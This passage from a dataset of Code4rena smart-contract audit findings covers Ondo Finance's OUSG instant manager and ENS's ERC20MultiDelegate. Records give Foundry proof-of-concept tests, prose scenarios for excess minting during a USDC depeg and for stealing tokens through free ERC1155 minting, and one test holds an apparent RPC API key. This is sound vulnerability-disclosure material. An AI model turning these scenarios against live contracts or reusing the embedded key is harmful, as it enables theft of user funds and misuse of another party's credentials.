commented](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/142#issuecomment-2044819320):**\n > I acknowledge this behavior is a design decision. However, I would keep this as a valid Medium for an audit report:\n> - There is an availability impact for users, in a condition that they did not necessarily have to purposely create for themselves.\n> - Users can decide to still withdraw for a loss in fees \"for minting more to redeem all\".\n> - The report highlights what I find to be a very reasonable mitigation - which could be the behavior users reasonably expect:\n> \n> > Allow users to remove all their funds from the contract even if it is below the minimum limit.\n> \n> This mitigation seems feasible and difficult to exploit for systematic, abusive bypasses of `minimumRedemptionAmount`, because both `OUSG` and `rOUSG` have a KYC requirement on token holders.\n\n**[cameronclifton (Ondo) disputed and commented](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/142#issuecomment-2073178615):**\n > We will not be removing minimum redemption requirement from the smart contract as there are other means in which users can redeem OUSG or rOUSG tokens from Ondo Finance.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/142).*\n\n***\n\n",
      "summary": "\nThis bug report is about a contract called `InstantManager` that limits the minimum amount of deposits and withdrawals for users. The issue is that the minimum withdrawal limit can cause users to lose access to part of their funds. For example, if a user deposits 100k `USDC` tokens and later withdraws 60k `USDC` tokens, they will only have 40k `USDC` tokens left in their account and cannot withdraw them because it falls below the minimum limit of 50k `USDC` tokens. The only option for the user is to deposit an additional 100k `USDC` tokens and then withdraw the full 140k `USDC` amount, incurring extra fees. The recommended solution is to allow users to withdraw all their funds, even if it falls below the minimum limit. However, the team behind the contract has disputed this solution and will not be implementing it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/142",
      "tags": [],
      "finders": [
        "carrotsmuggler",
        "radev\\_sw",
        "dvrkzy",
        "0xmystery",
        "Breeje",
        "0xCiphky"
      ]
    },
    {
      "id": "32009",
      "title": "[M-02] Inadequate handling of `BUIDL` redemption limit in `OUSG` instant manager",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-ondo-finance/blob/78779c30bebfd46e6f416b03066c55d587e8b30b/contracts/ousg/ousgInstantManager.sol#L426-L429> \n\n<https://github.com/code-423n4/2024-03-ondo-finance/blob/78779c30bebfd46e6f416b03066c55d587e8b30b/contracts/ousg/ousgInstantManager.sol#L460>\n\n### Impact\n\nThe `OUSG` Instant Redemption Manager contract contains an oversight in its `redeem` function, specifically in the handling of `BUIDL` redemption limits. This oversight can potentially lead to failed redemption attempts when the redemption balance exceeds the `BUIDL` balance held by the manager contract while it has a right amount if its concatenated with USDC amount left by another redemption process. The impact of this issue is significant as it affects the usability of the redemption feature and can result in user frustration and loss of trust in the system.\n\n### Proof of Concept\n\nThe following POC demonstrates the issue. Use it as part of `forge-tests/ousg/OUSGInstantManager/redeem.t.sol` file.\n\nRun using this command:\n\n```\nnpm run test-forge -- --match-test test_POC_redeem_fail_when_alice_redeemtion_balance_is_over_manager_BUIDL_balance\n```\n\n```solidity\n  function test_POC_redeem_fail_when_alice_redeemtion_balance_is_over_manager_BUIDL_balance()\n    public\n    setupSecuritize(500_000e6, 500_000e6)\n  {    \n    uint256 aliceOUSGRedeemAmount = 1667e18; \n    uint256 aliceUSDCAmount = 250_100e6;\n\n    uint256 bobOUSGRedeemAmount = 1666e18;\n    uint256 bobUSDCAmount = 249_900e6;\n\n\n    // Mint OUSG tokens for Alice and Bob\n    vm.prank(address(ousgInstantManager));\n    ousg.mint(alice, aliceOUSGRedeemAmount);\n\n    vm.prank(address(ousgInstantManager));\n    ousg.mint(bob, bobOUSGRedeemAmount);\n\n    // Bob redeems OUSG tokens successfully\n    vm.startPrank(bob);\n    ousg.approve(address(ousgInstantManager), (bobOUSGRedeemAmount));\n    ousgInstantManager.redeem(bobOUSGRedeemAmount);\n    vm.stopPrank();\n\n    // Alice attempts to redeem OUSG tokens, but the redemption fails due to insufficient BUIDL balance\n    vm.startPrank(alice);\n    ousg.approve(address(ousgInstantManager), (aliceOUSGRedeemAmount));\n    vm.expectRevert('Not enough tokens');\n    ousgInstantManager.redeem(aliceOUSGRedeemAmount);\n    vm.stopPrank();\n\n    assertEq(USDC.balanceOf(bob), bobUSDCAmount);\n\n    assertEq(\n      BUIDL.balanceOf(address(ousgInstantManager)) + USDC.balanceOf(address(ousgInstantManager)),\n      aliceUSDCAmount\n    );\n\n    // However if Alice try to reddem an amount that will be in usdc amount <= minBUIDLRedeemAmount in ousgInstantManager it will success\n    vm.startPrank(alice);\n    ousgInstantManager.redeem(aliceOUSGRedeemAmount - 10e18);\n    vm.stopPrank();\n\n    // Tokens remaining in Alice's balance after successful redemption\n    assertEq(ousg.balanceOf(alice), 10e18);\n\n  }\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nTo address this issue, the `OUSG` Instant Redemption Manager contract should implement a mechanism to ensure that redemption requests do not exceed the available `BUIDL` balance held by the manager contract. This can be achieved by incorporating proper checks and balances in the redemption process, such as verifying the `BUIDL` balance before processing redemption requests and adjusting the redemption amount accordingly. Additionally, consider an redeem implementation that concatenate the balance of remaining USDC amount with the `BUIDL` redeemed balance if the corresponding `USDC` amount or redeem amount of `OUSG` is more than `minBUIDLRedeemAmount`.\n\n### Assessed type\n\nError\n\n**[cameronclifton (Ondo) confirmed and commented](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/306#issuecomment-2071074179):**\n> Due to changing requirements, the contract will now concatenate the USDC amount with `BUIDL` when performing redemptions. (This should mitigate this already known issue). \n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/306).*\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue found in the `OUSG` Instant Redemption Manager contract on the Ondo Finance platform. The issue is related to the handling of `BUIDL` redemption limits, which can result in failed redemption attempts when the redemption balance exceeds the `BUIDL` balance held by the manager contract. This can affect the usability of the redemption feature and may lead to user frustration and loss of trust in the system. A proof of concept is provided to demonstrate the issue, and it is recommended that the contract implements proper checks and balances to prevent this from happening in the future. The type of this issue is assessed as an error. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/306",
      "tags": [],
      "finders": [
        "Limbooo",
        "Bigsam"
      ]
    },
    {
      "id": "32008",
      "title": "[M-01] Integration issue in `ousgInstantManager` with `BUIDL` if `minUSTokens` is set by blackrock",
      "impact": "MEDIUM",
      "content": "\nIntegration issues with `BUIDL`, in the case blackrock decides to set a minimum amount of `BUIDL` tokens that should be held by its holders.\n\n### Proof of Concept\n\nBlackrock implements a `minUSTokens;` variable where it sets a minimum amount to be held by the whitelisted addresses at all times. This check is done at every transfer. Currently, this is set to `0`; but this could be set by blackrock at anytime.\n\n```javascript\n    // get min us tokens \n    function getMinUSTokens() public view override returns (uint256) {\n        return minUSTokens;\n    }\n    \n    // set min us tokens  \n    function setMinUSTokens(uint256 _value) public override onlyTransferAgentOrAbove {\n        emit DSComplianceUIntRuleSet(\"minUSTokens\", minUSTokens, _value);\n        minUSTokens = _value;\n    }\n```\n\nThis is the code from the [`BUIDL token's contracts/compliance/ComplianceConfigurationService.Sol`](https://etherscan.deth.net/token/0x7712c34205737192402172409a8f7ccef8aa2aec#code) where the admin could set values for `minUSTokens`.\n\nAlso the line 238 in the [contracts/compliance/Compliance/ServiceRegulated.sol](https://etherscan.deth.net/token/0x7712c34205737192402172409a8f7ccef8aa2aec#code) is called when transferring token.\n\n```javascript\nif (  \n                _args.fromInvestorBalance > _args.value &&\n                _args.fromInvestorBalance - _args.value < IDSComplianceConfigurationService(_services[COMPLIANCE_CONFIGURATION_SERVICE]).getMinUSTokens() \n            ) {\n                return (51, AMOUNT_OF_TOKENS_UNDER_MIN);\n            }\n```\n\nThis essentially checks that the sender has at least the minimum amount of tokens after the transfer.\n\nThe problem is the `ousgInstantManager` doesn't require that it always has this much amount of `BUIDL`. When redeeming, suppose it has 300k `BUIDL` and the minimum is say 10k `BUIDL` and an investor in Ondo wants to redeem 300k `BUIDL` tokens. It would still revert even though the contract has it, which could unexpectedly revert; violating one the main functionalities for Ondo (i.e. the instant redeem).\n\n### Code\n\nCreate a new test file and paste this code below:\n\n```solidity\n//SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ninterface IBUILDPause {\n    function pause() external;\n    function isPaused() external returns(bool);\n    \n}\n\ninterface IBUiLDRedeemer {\n    function redeem(uint256 amount) external;\n}\n// 0x1e695A689CF29c8fE0AF6848A957e3f84B61Fe69\ncontract testBUILD is Test {\n    // holders of BUILD tokens; just for test \n    address holder1 = 0x72Be8C14B7564f7a61ba2f6B7E50D18DC1D4B63D;\n    address holder2 = 0xEd71aa0dA4fdBA512FfA398fcFf9db8C49A5Cf72;\n    address holder3 = 0xdc77C1D2A1dC61A31BE81e4840368DffEFAC3add;\n    address holder4 = 0x1e695A689CF29c8fE0AF6848A957e3f84B61Fe69;\n    address holder5 = 0xBc2cb4bF5510A1cc06863C96196a2361C8462525;\n    address holder6 = 0xc02Ac677e58e40b66f100be3a721bA944807C2D7;\n    address holder7 = 0x12c0de58D3b720024324d5B216DDFE8B29adB0b4;\n    address holder8 = 0xb3c62fbe3E797502A978f418582ee92a5F327C23;\n    address holder9 = 0x568430C66F9A256f609Ac07190d70c2c2573E065;\n    \n    // we get the owner form etherscan \n    address ownerOfBUILD = 0xe01605f6b6dC593b7d2917F4a0940db2A625b09e;\n    \n    address build = 0x7712c34205737192402172409a8F7ccef8aA2AEc; // build token address \n    IERC20 BUILD;   \n\n\n    uint256 MAINNET_FORK;\n\n    function setUp() external {\n        MAINNET_FORK = vm.createFork(\"https://eth-mainnet.g.alchemy.com/v2/IrK2bvsF-q028QswCasD1dQqxV8nqGMs\");\n        vm.selectFork(MAINNET_FORK);\n        BUILD = IERC20(build);\n    }\n\n    function testBUILDHolderTransfer() public {\n        address sender = holder1;\n        address to = holder9;\n        uint amountToSend = 90000000e6;\n\n        uint totalBalance = BUILD.balanceOf(sender);\n        \n        vm.startPrank(sender); // random 5 million holder\n        BUILD.transfer(to, amountToSend); // transfer 1 million to alice \n        console.log(totalBalance);\n        console.log(BUILD.balanceOf(sender));\n        console.log(BUILD.balanceOf(to));\n    }\n\n\n    function testMinTokensUS() external { //0x1dc378568cefD4596C5F9f9A14256D8250b56369\n        COMPLIANCE compliance = COMPLIANCE(0x1dc378568cefD4596C5F9f9A14256D8250b56369); // compliance configuration service\n        console.log(compliance.getMinUSTokens());\n        console.log(compliance.getUSLockPeriod());\n\n        vm.startPrank(0xe01605f6b6dC593b7d2917F4a0940db2A625b09e); // owner address form etherscan \n        compliance.setMinUSTokens(10000000e6);\n\n        console.log(compliance.getMinUSTokens());\n        vm.stopPrank();\n\n        address sender = holder1;\n        address to = holder9;\n        uint amountToSend = 90000000e6;\n\n        \n        \n        vm.startPrank(sender); \n        BUILD.transfer(to, amountToSend);\n        uint totalBalance = BUILD.balanceOf(sender); \n        console.log(totalBalance);\n        console.log(BUILD.balanceOf(sender));\n        console.log(BUILD.balanceOf(to));\n\n    }\n```\n\nRun `forge test --mt testBUILDHolderTransfer` which will pass but run `forge test --mt testMinTokensUS -vvv`, i.e. with the same amount after owner sets `minUSTokens` to 10 million, it will revert.\n\nNote: 10 million is a very large amount and not realistic, it is just to show for the test because the holder 1 has more than 90 million `BUIDL`. I just set to 10 million to show it will revert. The real value set could be significantly lower than this.\n\nHere in our example, when holder1 tries to transfer the code checks and notice that after transfer the holder will have less than the minimum, i.e. 10 million, so it reverts.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nImport `IDSComplianceConfigurationService` or create an interface just for the `getMinUSTokens()` function and consider replacing the require statement in the `_redeemBUIDL` function with:\n\n```javascript\n function _redeemBUIDL(uint256 buidlAmountToRedeem) internal { \n    require(\n      buidl.balanceOf(address(this)) - IDSComplianceConfigurationService(0x1dc378568cefD4596C5F9f9A14256D8250b56369).getMinUSTokens >= minBUIDLRedeemAmount,  \n      \"OUSGInstantManager::_redeemBUIDL: Insufficient BUIDL balance\" \n    );\n```\n\nThe contract will never try to redeem more than its minimum allowed to hold and appropriately reverts with our error message: **\"`OUSGInstantManager::_redeemBUIDL: Insufficient BUIDL balance`\"**\n\nWe get the address `0x1dc378568cefD4596C5F9f9A14256D8250b56369` of the `complianceConfigurationService` proxy by querying the `BUIDL` [contract](https://etherscan.io/readContract?m=light\\&a=0x7712c34205737192402172409a8f7ccef8aa2aec\\&n=mainnet\\&v=0x603bb6909be14f83282e03632280d91be7fb83b2#readCollapse27) in etherscan using the function `no.27 getDSService` with 256 as the argument.\n\nThis minimum amount required may not be set currently but could be set by the admin in the future. So, implementing it now should be more compatible with `BUIDL`, even if in the future blackrock decides to set it.\n\n### Assessed type\n\nInvalid Validation\n\n**[cameronclifton (Ondo) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/309#issuecomment-2048004225):**\n > We will not mitigate this in the smart contract code. We plan to work with the BUIDL team to better understand the conditions in which `minUSTokens` will be set. \n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/309).*\n\n***\n\n",
      "summary": "\nThe bug report is about an integration issue with the `BUIDL` token, specifically regarding the setting of a minimum amount of tokens that should be held by its holders. Currently, the `minUSTokens` variable is set to 0, but it can be changed by the token's admin at any time. This variable is used to check the minimum amount of tokens a holder should have when making a transfer. However, this check is not applied when redeeming tokens, which can lead to unexpected reverts. The bug report suggests implementing a new function or interface to handle this check when redeeming tokens, in case the admin decides to set a minimum amount in the future. The bug is classified as an \"Invalid Validation\" and the Ondo team plans to work with the BUIDL team to better understand the conditions in which the `minUSTokens` variable will be set.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/309",
      "tags": [],
      "finders": [
        "asui"
      ]
    },
    {
      "id": "32007",
      "title": "[H-01] `OUSGInstantManager` will allow excessive `OUSG` token minting during `USDC` depeg event",
      "impact": "HIGH",
      "content": "\nAny user can use `mint` function in `ousgInstantManager` contract to mint `OUSG` tokens by providing `USDC` token. It calls internal function `_mint` where the main logic resides.\n\n```solidity\n\n  function _mint(uint256 usdcAmountIn, address to) internal returns (uint256 ousgAmountOut) {\n    \n    // SNIP: Validation\n\n    uint256 usdcfees = _getInstantMintFees(usdcAmountIn);\n    uint256 usdcAmountAfterFee = usdcAmountIn - usdcfees;\n\n    // Calculate the mint amount based on mint fees and usdc quantity\n    uint256 ousgPrice = getOUSGPrice();\n    ousgAmountOut = _getMintAmount(usdcAmountAfterFee, ousgPrice);\n\n    require(ousgAmountOut > 0, \"OUSGInstantManager::_mint: net mint amount can't be zero\");\n\n    // SNIP: Transfering USDC\n\n    ousg.mint(to, ousgAmountOut);\n  }\n```\n\n### Two important points to understand\n\n**`OUSG` Price Stability:**\n\nThe contract depends on the `OUSG` price obtained from an oracle, which is heavily constrained (as per Readme) to ensure stability.\n\n> `OUSG` Price - The `OUSG` price tracks an off chain portfolio of cash equivalents and treasury bills, price changes are heavily constrained in the `OUSG` Oracle, which uses the change in the price of SHV to set the allowable `OUSG` price in between updates. We are aware that the SHV price could differ from the `OUSG` portfolio, so any findings related to this price discrepancy is out of scope. Also, scenarios where the `OUSG` price increases by many orders of magnitudes are not realistic and consequently not considered valid.\n\nAs per `RWAOracleRateCheck` Oracle, constraints includes:\n\n1. `OUSG` price updates restricted to once every `23 hours`.\n2. Price deviations limited to a maximum of `1%`.\n\n```solidity\n      function setPrice(int256 newPrice) external onlyRole(SETTER_ROLE) {\n        if (newPrice <= 0) {\n          revert InvalidPrice();\n        }\n @->    if (block.timestamp - priceTimestamp < MIN_PRICE_UPDATE_WINDOW) {\n          revert PriceUpdateWindowViolation();\n        }\n @->    if (_getPriceChangeBps(rwaPrice, newPrice) > MAX_CHANGE_DIFF_BPS) {\n          revert DeltaDifferenceConstraintViolation();\n        }\n\n        // Set new price\n        int256 oldPrice = rwaPrice;\n        rwaPrice = newPrice;\n        priceTimestamp = block.timestamp;\n\n        emit RWAPriceSet(oldPrice, newPrice, block.timestamp);\n      }\n```\n\nThese constraints ensure relative stability of the `OUSG` price.\n\n**Calculation Assumptions:**\n\nThe calculation of the amount of `OUSG` tokens to mint assumes a fixed conversion rate of `1 USDC = 1 USD`.\n\nKey point: The `_getMintAmount` function calculates the `OUSG` amount based on the provided `USDC` amount and the `OUSG` price obtained from the oracle (by just upscaling and dividing).\n\n```solidity\n  function _getMintAmount(\n    uint256 usdcAmountIn,\n    uint256 price\n  ) internal view returns (uint256 ousgAmountOut) {\n    uint256 amountE36 = _scaleUp(usdcAmountIn) * 1e18;\n    ousgAmountOut = amountE36 / price;\n  }\n```\n\nHere, there are no validation checks implemented regarding the current `USDC` price.\n\n### Scenario of the issue\n\nConsider Alice's attempt to mint `OUSG` tokens by providing `100,000 USDC`, assuming no minting fees and `OUSG` price of `105e18` `USD`. The calculation yields: `100_000e36 / 105e18` which is approximately `95_000e18` or `95_000` `OUSG` tokens for the `100_000` `USDC` provided.\n\nHowever, in the event of a `USDC` depeg, where `USDC`'s value deviates from 1 `USD`:\n\n- The contract's calculation logic remains unchanged.\n- Despite the depeg, the `OUSG` price remains fairly constant (maximum 1% deviation allowed in 23 hours).\n\nThis scenario leads to Alice getting close to `95_000` `OUSG` tokens again for `100_000 USDC` provided. But this time, `100_000 USDC` can be worth as low as `87_000` `USD` if we take recent depeg event in March 2023, where `USDC` price went as low as 87 cents ([reference](https://decrypt.co/123211/usdc-stablecoin-depegs-90-cents-circle-exposure-silicon-valley-bank)).\n\nThis way, contract will allow users to mint excessive `OUSG` tokens during the depeg event.\n\n### Impact\n\nMinting of excessive token in case of `USDC` depeg.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nIdeally, there needs to be an additional Oracle to check current price of `USDC` and take its price into the consideration when calculation `OUSG` tokens to mint.\n\n### Assessed type\n\nContext\n\n**[3docSec (judge) increased severity to High and commented](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/278#issuecomment-2044628674):**\n > Upgraded as High because there is risk of value extraction from the protocol under conditions that can be monitored by an attacker.\n\n**[cameronclifton (Ondo) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/278#issuecomment-2052670415):**\n > After further review, we will be mitigating this by adding a Chainlink `USDC`/`USD` oracle to the `OUSGInstantManager` contract.  If the price is lower than what we are comfortable with, all mints and redemptions will be blocked. While we think it is unlikely that we won't be able to convert `USDC->USD` 1:1 in our backend systems, we decided to do this out of extreme caution.  \n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/278).*\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the `ousgInstantManager` contract where users can mint excessive `OUSG` tokens by providing `USDC` tokens. This is due to the contract's reliance on the `OUSG` price obtained from an oracle, which is heavily constrained to ensure stability. The bug can be triggered in the event of a `USDC` depeg, where the `USDC` price deviates from 1 `USD`. This can lead to the minting of excessive tokens, causing potential value extraction from the protocol. To mitigate this, the team plans to add a Chainlink `USDC`/`USD` oracle to the contract and block all mints and redemptions if the price is lower than expected.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2024-03-ondo-finance",
      "github_link": "https://github.com/code-423n4/2024-03-ondo-finance-findings/issues/278",
      "tags": [],
      "finders": [
        "HChang26",
        "Arz",
        "Breeje",
        "immeas"
      ]
    },
    {
      "id": "28940",
      "title": "[N-04] Contract name is misleading",
      "impact": "LOW",
      "content": "\nThe contract name is `ERC20MultiDelegate`, strongly implies it is an ERC20 token. Such naming can cause confusion, as:\n- It is not an ERC20 token, but rather an ERC1155.\n- It acts as a wrapper for any standard ERC20Votes, enabling multiple delegations, but cannot be a standalone token by itself.\n\nWe suggest a more descriptive name, such as `ERC20VotesMultiDelegateWrapper`.\n\n**[Arachnid (ENS) confirmed and commented](https://github.com/code-423n4/2023-10-ens-findings/issues/272#issuecomment-1764142628):**\n > Agree except N-02; reentrancy guards are a bandaid for poorly written code, and using one here would waste gas.\n\n**[hansfriese (judge) commented](https://github.com/code-423n4/2023-10-ens-findings/issues/272#issuecomment-1779767853):**\n> [L-02] - Medium<br>\n> [S-01] - Non-critical \n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-10-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "28939",
      "title": "[N-03] `_reimburse()` docs are slightly inconsistent with its behavior",
      "impact": "LOW",
      "content": "\nThe docs for function `_reimburse()` mentions:\n\n```solidity\n/**\n * @dev Reimburses any remaining source amounts back to the delegator after the delegation transfer process.\n * @param source The source delegate from which tokens are being withdrawn.\n * @param amount The amount of tokens to be withdrawn from the source delegate.\n */\n// ...\n\n// Transfer the remaining source amount or the full source amount\n// (if no remaining amount) to the delegator\n```\n\nHowever, the function always (attempts to) transfers exactly `amount`, which should be specified as a function parameter earlier in the `delegateMulti()` call. This is inconsistent with the documentation\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-10-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "28938",
      "title": "[N-02] `delegateMulti()` should be protected with a reentrancy guard.",
      "impact": "LOW",
      "content": "\nThe function `delegateMulti()` may mint ERC1155 tokens, which in turn may invoke a `onERC1155Received()` at the recipient (if it is a contract). This opens up potential for reentrancy.\n\nWhile we evaluated that the function correctly follows the CEI pattern and did not identify a potential attack vector, we do believe a proper reentrancy guard in place is good practice. \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-10-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "28937",
      "title": "[N-01] Documentation should mention minting of ERC1155 when calling `delegateMulti()`",
      "impact": "LOW",
      "content": "\nWhen `delegateMulti()` is called, ERC1155 tokens may be minted. However, following ERC1155 standards, the recipient must either be an EOA, or a contract implementing `ERC1155Holder`, or the tx will revert.\n\nWhile this should be the correct and intended behavior, the fact that ERC1155 is minted is not documented in the function. This may cause unintended reverts to e.g. multisigs, or other interacting contracts.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-10-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "28936",
      "title": "[S-01] Tokenizing vote delegation is a new idea. User should be notified/contract should be documented to prevent transferring away their ERC1155",
      "impact": "LOW",
      "content": "\nThe `ERC20MultiDelegate` splits delegation by wrapping ENS, and tokenizing it into an ERC1155, with the ID being the delegatee. We note some of the behaviors that we, as a user, may not expect it to have:\n- In the `ERC20MultiDelegate` ERC1155, transferring the token retains the voting power to the current delegatee.\n    - In the vanilla ERC20Votes, transferring away ERC20 tokens also transfers away the voting power (i.e. if Alice transfers tokens to Bob, then Alice's delegatee's voting power is transferred to Bob's delegatee).\n- ERC1155 is a transferrable token. However, transferring away `ERC20MultiDelegate` is equivalent to transferring away ENS. The token may show up on block explorers such as etherscan, and users may attempt to transfer it away, losing their funds as a result.\n    - This can be achieved by social engineering or other non-blockchain attacks.\n\nThese are some behaviors of the token that we find, while logically sound, should not be unexpected for a user to deduce at first usage. Users should be made aware of the vote tokenizing mechanism to prevent accidentally losing funds.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-10-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "28935",
      "title": "[L-03] OpenZeppelin's ERC1155 forces contract recipients to implement `onERC115Received`",
      "impact": "LOW",
      "content": "\nThe ERC721 token, closely related to ERC1155, has a `_safeMint` mechanism, where a contract recipient must implement `onERC721Received` to receive the minted NFT, otherwise, the call will revert. This is to ensure that contract NFTs cannot be stuck in smart contracts.\n\nHowever, in OpenZeppelin's ERC1155, the function [`_mintBatch()`](https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L114) requires that a contract user [must be able to accept the token](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC1155/ERC1155.sol#L321), that is, it implements the ERC721-like safe mint mechanism by default.\n\nThis brings forth an edge case where contract recipients (e.g. multisigs) may fail to delegate due to not being able to accept the token. We urge the sponsor to double check on whether this is the intended mechanism.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-10-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "28934",
      "title": "[L-02] ERC1155 can be inflated if the token doesn't revert on failed transfer",
      "impact": "LOW",
      "content": "\nWhile the only ERC20 token that the contract interacts with is the designated token with voting capability, if the token does not revert on failed transfer (e.g. transfer exceeds balance), then anyone can infinitely mint the ERC1155 token. This can be extended into a honeypot attack vector that can steal funds from successful transfers.\n\n**POC**:\n- Alice doesn't own any tokens.\n- Alice can mint ERC1155 for some delegate for free by using `delegateMulti`.\n- Bob mints ERC1155 for the same delegate, using their tokens.\n- Alice burns their ERC1155, stealing Bob's tokens.\n\nAlice can be aware of Bob's delegatee by simply front-running.\n\nWe recognize this as a low severity issue because, while the impact is high, we could not identify such a token with both voting capability and doesn't revert on failed transfer. However, we do not rule out the possibility that such a token does exist.\n\nThe recommended mitigation method is to use OpenZeppelin's `safeTransfer`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-10-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "28933",
      "title": "[L-01] `assert()` does not provide any information when thrown.",
      "impact": "LOW",
      "content": "\n*This finding escalates **[N-09]** of the automated report.*\n\nhttps://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L131\n\nThe following assertion will throw when the user attempts to re-delegate more than the existing amount. Using `assert` here has the following two issues:\n1. `assert` does not provide any error message when thrown, while it should have been reported told as an `Insufficient balance` error message or similar.\n2. Even if the condition passes, the tx is guaranteed to fail at the `_burnBatch` call anyway, as the owner would not have enough ERC1155 to burn.\n\nWe suggest changing `assert` to a `require` statement, with a clear error message, or using custom errors.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-10-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "28932",
      "title": "[M-01] Some tokens enable the direct draining of all approved `ERC20Votes` tokens",
      "impact": "MEDIUM",
      "content": "\n### Lines of code\n\n<https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L148><br>\n<https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L160><br>\n<https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L170><br>\n<https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L101-L115>\n\n### Vulnerability details\n\nThere's an appropriately invalidated finding found by the bots during the bot race about the [unsafe use of `transferFrom` on non-standard ERC20 tokens](https://github.com/code-423n4/2023-10-ens/blob/main/bot-report.md#d24-unsafe-use-of-erc20-transfertransferfrom). The finding is mostly invalid because, here, we're using `ERC20Votes` tokens, not `ERC20` ones; hence the mentioned tokens like USDT aren't good arguments.\n\nI would like to argue, however, that the recommendation that would've been true here would be to wrap the `transferFrom` calls in a `require` statement, as the `transferFrom` functions used in `ERC20Votes` are still from the inherited `ERC20` interface and therefore could be returning a boolean (`transferFrom(address from, address to, uint256 amount) returns bool`, see [OpenZeppelin's implementation](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20-transferFrom-address-address-uint256-)), instead of reverting, depending on the existence of such an `ERC20Votes` token. The assumption of an `ERC20Votes` token returning `true` or `false` instead of reverting will be used in this argumentation and be considered a possibility; especially since the list of potential `ERC20Votes token`s used by this contract isn't specified (`ENSToken` isn't enforced). Also, see [these posts](https://discord.com/channels/810916927919620096/1159158237325697166/1160653235703521451) from the Discord channel:\n\n> Question by J4X â€” Hey @nickjohnson, are we correct to assume that this will only be deployed on ethereum?\n> \n> Answer by nickjohnson â€” By us, yes, but consider the goal of the audit to be against any wrapped erc20votes token, not just `$`ens.\n\n**About this finding:**\n\nThis finding is the second one in a series of 2 findings using a similar set of arguments, but the first is used here as a chain:\n\n1. Some tokens break accounting by enabling the free minting of `ERC20MultiDelegate` 